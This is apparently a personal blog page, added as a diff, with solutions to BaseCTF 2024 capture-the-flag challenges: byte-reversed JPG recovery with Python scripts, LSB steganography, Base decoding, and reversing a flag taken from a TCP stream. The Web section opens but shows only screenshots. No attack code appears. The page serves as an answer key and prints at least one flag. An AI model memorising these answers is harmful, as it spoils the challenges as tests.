@@ -1,0 +1,825 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chaye">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="MISC正着看还是反着看呢？看到要倒序，注意他这里是两个字节一组进行倒序的 jpg 文件头 FF D8 FF E0 文件尾是 FF D9  D9FF    可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理 如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失  选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BASECTF 2024">
+<meta property="og:url" content="http://example.com/2025/03/29/BASEctf/index.html">
+<meta property="og:site_name" content="chaye的博客">
+<meta property="og:description" content="MISC正着看还是反着看呢？看到要倒序，注意他这里是两个字节一组进行倒序的 jpg 文件头 FF D8 FF E0 文件尾是 FF D9  D9FF    可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理 如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失  选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723716519153-5455cc00-e756-47a2-a136-4f594c257acc.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723709782600-9660b563-5c41-422a-a520-80ae7c5411ff.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723709789902-41e00339-f363-4a40-b9f8-a83c371f1d31.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723785613300-2ff9675c-5ad5-4703-a36b-54452031df37.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723785259200-bb24c72a-07a5-442e-a0eb-1c32200a36b5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724933543672-1cfcab0f-d724-40cf-8b78-7ab89c23824b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724933569251-ccb5569a-b138-40d0-bf18-de90bc2ac238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724934034599-cb7c55f3-9300-418a-a0c4-2441c812090c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724934074769-964e3c0f-1663-4090-96d1-4222eb1e0e14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723700567511-9ad81ae1-ba26-4d1d-9744-85f18a01de88.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723700310858-93b48e05-f327-4e19-8368-0b65e44ab2cb.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723700409017-8c0d25aa-0848-420c-b759-8a1aaac9fcdf.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723788922732-8cdc0929-a1fe-4ac2-b28d-23805546930c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723788908960-1c2fb903-1dbc-4e78-80b4-bf7b773a547a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723789577517-e99d9957-f220-438a-8ca0-67e581712d40.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792218249-f2dc7631-e715-4806-8082-109fe46a23e2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792234932-c1f630e2-3618-4624-9e59-82e523a49066.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723790165788-815a3da9-3429-4422-ae06-75a0ed54b803.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723790297615-5a4bd355-f9f5-4260-9732-63e764528d57.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723795805377-0ffdfa60-121f-4f40-a9ab-00f371c7a769.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723795822023-44bc8437-817b-4b61-a9b6-c0faf520e1a7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793117335-90f7fdf9-d544-40a0-9f16-6df23d6f99ef.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793465236-77f3632f-e936-41b1-876d-a19eefd19df9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793619918-61fa78e3-90d2-4264-b5ec-08fd3264848f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793726319-06f98ac9-7278-49b7-a3e1-a1951becb0a9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723793808260-a92db341-64ba-4d90-aa56-bfcbb256be6a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721808648617-db61a13a-5fd8-484a-b5e9-932d510f0534.png?x-oss-process=image/format,webp/resize,w_1237,limit_0">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724042980823-00939c02-4eff-42fd-9929-36f5395bc6ba.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724042938596-0786a2be-f5b2-402d-8ed3-619a9ab39bf0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724043316235-079eff0b-6067-4002-807c-b972a96ba727.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723716996028-c4898f89-83ff-481a-82a7-639589ffe6f1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717176777-bf9d51a5-9df8-4a30-bbe0-fef369fcf2ce.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717153510-76fe3d15-9917-44f4-abf9-1b7ce0f936d9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717372424-b7212e6a-9178-4e1d-b7ef-e64a670f5a0b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723717391740-0464189d-8cfb-4486-b997-fc10fee6b7b9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720497439-dd92058e-0e93-4f2b-997d-d990d70408c0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720599630-543dca3c-704d-449c-b73c-d6d2fd0d4556.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720632310-0566c1e8-e404-4186-91e2-cd89b1711451.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724038834954-71c5afd9-7e76-4de9-aaa9-82649b584458.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039139378-bab032d3-fecc-4d0a-b6d3-a6efbd5514c0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039385190-c7ba5903-0963-413c-ab43-ddfeb3732a6e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720756607-c5e3f750-28f2-4bf6-9231-b4d11ff18709.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723721129646-be7dfa2c-b212-421b-bda3-d8cdb3bffa5b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723720955778-8eb1ac27-68ef-416c-b585-8d69be929de4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723721240184-ec5eb2fe-eaaa-4e59-9247-f8636ba23759.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723721440417-9f2cd484-e12c-4011-9a01-396a79c504d1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723725020955-fb895653-e442-4383-b500-fd27029cb6d1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792333054-25615cc1-9fb2-4804-a0fd-d51148e4eeb4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723792371314-8a8d272b-ad4c-4e7e-b87f-18c0989873c6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039671519-b818d7e1-7edf-4272-b703-9687559fba96.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724039788793-5ae8b15e-3993-4658-86d3-2fef8743f494.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724927341548-f8ff8e93-dddd-47e0-b72a-ca5f00289136.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724927606635-38ab506f-bb39-4901-bedf-f7a07da08e17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724927989037-69da9568-4f34-421c-9a3b-5637bdfaf346.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724928130673-24441937-b80d-4c8b-93ac-685897db8502.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/42988179/1724928152970-51119154-c262-4d49-a4e5-69d3dc49dc81.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724929366218-495fa013-d99c-439f-a11c-3bd0b1bf829a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724931762695-32bc1293-4335-4936-be60-0c5937f0fb7b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724932198797-893f2796-4b86-4ffa-a41d-2e64c3054c6a.png">
+<meta property="article:published_time" content="2025-03-29T06:51:17.320Z">
+<meta property="article:modified_time" content="2025-03-29T06:58:11.729Z">
+<meta property="article:author" content="chaye">
+<meta property="article:tag" content="2024比赛">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png">
+  
+  
+  
+  <title>BASECTF 2024 - chaye的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>chaye</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BASECTF 2024"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-29 14:51" pubdate>
+          March 29, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BASECTF 2024</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="正着看还是反着看呢？"><a href="#正着看还是反着看呢？" class="headerlink" title="正着看还是反着看呢？"></a>正着看还是反着看呢？</h2><p>看到要倒序，注意他这里是两个字节一组进行倒序的</p>
+<p>jpg 文件头 FF D8 FF E0</p>
+<p>文件尾是 FF D9 </p>
+<p>D9FF</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#DF2A3F;">可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理</font></p>
+<p><font style="color:#DF2A3F;">如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失</font></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:rgb(77, 77, 77);">选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后编写脚本</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 打开并读取原始文件内容<br>with open(r&#x27;D:\网站下载\exppy\1.txt&#x27;, &#x27;rb&#x27;) as f:<br>    a = f.read()<br><br># 去掉原始数据中的换行符、空格等不可见字符<br>a = a.replace(b&#x27;\n&#x27;, b&#x27;&#x27;).replace(b&#x27;\r&#x27;, b&#x27;&#x27;).replace(b&#x27; &#x27;, b&#x27;&#x27;)<br><br># 将内容逆序<br>a = a[::-1]<br><br># 将逆序内容写入新的文件<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;wb&#x27;) as new:<br>    new.write(a)<br><br># 读取逆序后的文件内容<br>with open(r&#x27;D:\网站下载\exppy\new.txt&#x27;, &#x27;rb&#x27;) as f:<br>    b = f.read()<br><br># 将内容转换为可变的字节数组<br>blist = bytearray(b)<br><br># 按两个字节为一组进行交换<br>for i in range(0, len(blist) - 1, 2):<br>    blist[i], blist[i + 1] = blist[i + 1], blist[i]<br><br># 打开目标文件以写入最终内容<br>with open(r&#x27;D:\网站下载\exppy\flag.txt&#x27;, &#x27;wb&#x27;) as flag:<br>    # 将所有处理后的字节内容连续写入文件<br>    flag.write(blist)<br><br># 打印最终处理的内容（以逆序显示）<br>print(blist)<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">def format_hex_data_from_file(input_file, output_file):<br>    # 读取文件内容<br>    with open(input_file, &#x27;r&#x27;) as file:<br>        hex_data = file.read().strip()<br><br>    # 将字符串分成每两个字符一组<br>    grouped_data = [hex_data[i:i + 2] for i in range(0, len(hex_data), 2)]<br><br>    # 以16组为一行，每组之间用空格隔开<br>    formatted_data = &#x27;\n&#x27;.join([&#x27; &#x27;.join(grouped_data[i:i + 16]) for i in range(0, len(grouped_data), 16)])<br><br>    # 将格式化后的数据写入输出文件<br>    with open(output_file, &#x27;w&#x27;) as file:<br>        file.write(formatted_data)<br><br><br># 输入和输出文件路径<br>input_file = r&#x27;D:\网站下载\exppy\flag.txt&#x27;<br>output_file = r&#x27;D:\网站下载\exppy\newflag.txt&#x27;<br><br># 格式化并写入输出文件<br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#DF2A3F;">导入十六进制，保存，修改后缀名为jpg，</font><font style="color:rgb(77, 77, 77);">（文件→导入十六进制→保存→重命名为flag.jpg)</font></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到照片</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723716519153-5455cc00-e756-47a2-a136-4f594c257acc.jpeg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开就可以看到啦</p>
+<p><font style="color:rgb(77, 77, 77);"></font></p>
+<h2 id="你也喜欢圣物吗"><a href="#你也喜欢圣物吗" class="headerlink" title="你也喜欢圣物吗"></a>你也喜欢圣物吗</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723709782600-9660b563-5c41-422a-a520-80ae7c5411ff.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723709789902-41e00339-f363-4a40-b9f8-a83c371f1d31.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723785613300-2ff9675c-5ad5-4703-a36b-54452031df37.png" srcset="/img/loading.gif" lazyload></p>
+<p>还可以用zsteg</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723785259200-bb24c72a-07a5-442e-a0eb-1c32200a36b5.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿到key解开zip</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724933543672-1cfcab0f-d724-40cf-8b78-7ab89c23824b.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724933569251-ccb5569a-b138-40d0-bf18-de90bc2ac238.png" srcset="/img/loading.gif" lazyload></p>
+<p>真正的flag在txt下面（wcnmd）</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724934034599-cb7c55f3-9300-418a-a0c4-2441c812090c.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1724934074769-964e3c0f-1663-4090-96d1-4222eb1e0e14.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723700567511-9ad81ae1-ba26-4d1d-9744-85f18a01de88.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="海上遇到了鲨鱼"><a href="#海上遇到了鲨鱼" class="headerlink" title="海上遇到了鲨鱼"></a>海上遇到了鲨鱼</h2><p>追踪tcp流，然后倒序输出就行</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723700310858-93b48e05-f327-4e19-8368-0b65e44ab2cb.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=&#x27;&#125;67bf613763ca-50b3-4437-7a3a-b683fe51&#123;FTCesaB&#x27;<br>print(a[::-1])<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723700409017-8c0d25aa-0848-420c-b759-8a1aaac9fcdf.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="捂住X只耳"><a href="#捂住X只耳" class="headerlink" title="捂住X只耳"></a>捂住X只耳</h2><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723788922732-8cdc0929-a1fe-4ac2-b28d-23805546930c.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723788908960-1c2fb903-1dbc-4e78-80b4-bf7b773a547a.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/1723789577517-e99d9957-f220-438a-8ca0-67e581712d40.png" srcset="/img/loading.gif" lazyload></p>
